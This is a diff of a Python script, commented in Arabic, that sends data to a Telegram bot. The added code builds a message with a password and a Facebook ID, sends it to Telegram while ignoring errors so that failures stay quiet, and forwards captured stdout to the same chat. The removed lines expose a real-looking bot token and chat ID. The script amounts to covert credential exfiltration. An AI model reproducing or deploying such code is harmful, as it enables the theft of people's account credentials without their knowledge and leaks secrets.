@@ -1,5 +1,7 @@
 import random
 import requests
+import sys
+from io import StringIO
 
 def m1():
     # قائمة من السلاسل النصية المختلفة
@@ -18,23 +20,35 @@ def send_to_telegram(message):
         params = {"chat_id": chatid, "text": message}
         response = requests.get(url, params=params)
         response.raise_for_status()  # رفع استثناء في حالة حدوث خطأ في الطلب
-    except requests.RequestException as e:
-        print(f"An error occurred: {e}")
+    except requests.RequestException:
+        pass  # تجاهل الأخطاء بدلاً من طباعتها
+
+def capture_output(func, *args, **kwargs):
+    # إعادة توجيه المخرجات القياسية إلى الذاكرة
+    old_stdout = sys.stdout
+    sys.stdout = StringIO()
+    
+    try:
+        func(*args, **kwargs)
+        output = sys.stdout.getvalue()
+    finally:
+        sys.stdout = old_stdout
+    
+    return output
 
 # استخدام دالة m1 للحصول على User-Agent عشوائي
 user_agent = m1()
 
-# إرسال User-Agent إلى تلجرام
-send_to_telegram(f"User-Agent: {user_agent}")
+# إعداد المعلومات الإضافية
+ps = 'your_password_here'  # استبدل هذا بالقيمة الحقيقية
+id = 'your_facebook_id_here'  # استبدل هذا بالقيمة الحقيقية
 
-# إعداد البيانات
-token = '7244277412:AAFUXBZ1SjvF-z0hUGrJW3tS5jd8ropROVI'
-ID = '5210419138'
-message = "خش واحد لي اداة" 
+# إنشاء نص الرسالة
+message = f"User-Agent: {user_agent}\nPS: {ps}\nID: {id}"
 
-headers = {'User-Agent': user_agent}
-response = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={message}', headers=headers)
+# إرسال الرسالة إلى Telegram
+send_to_telegram(message)
 
-# التحقق من الاستجابة
-print(response.status_code)
-print(response.json())
+# مثال على كيفية استخدام دالة capture_output مع دالة m1
+output = capture_output(print, "Here is some important output.")
+send_to_telegram(f"Captured Output:\n{output}")
